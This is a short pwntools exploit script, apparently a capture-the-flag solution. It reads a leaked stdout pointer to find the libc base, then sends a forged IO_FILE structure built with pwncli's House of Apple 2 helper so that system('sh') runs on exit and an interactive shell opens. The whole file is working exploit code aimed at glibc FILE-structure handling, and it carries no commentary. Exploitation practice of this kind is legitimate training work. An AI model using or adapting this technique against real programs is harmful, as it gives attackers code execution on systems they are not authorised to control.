from pwn import *
from pwncli import IO_FILE_plus_struct

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary, checksec=False)
libc = e.libc

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('127.0.0.1', 31337)
    else:
        return process(e.path)


def leak_libc():
    p.recvuntil(b'Here is your foundation: ')
    stdout = int(p.recvline().strip(b'\n'), 16)
    libc.address = stdout-libc.sym['_IO_2_1_stdout_']
    log.info("Libc Base: 0x%x" % libc.address)


p = start()

leak_libc()

payload = IO_FILE_plus_struct().house_of_apple2_execmd_when_exit(
    libc.sym['_IO_2_1_stdout_'], libc.sym._IO_wfile_jumps, libc.sym.system, "sh")[:0xe0-1]

p.send(payload)

p.interactive()
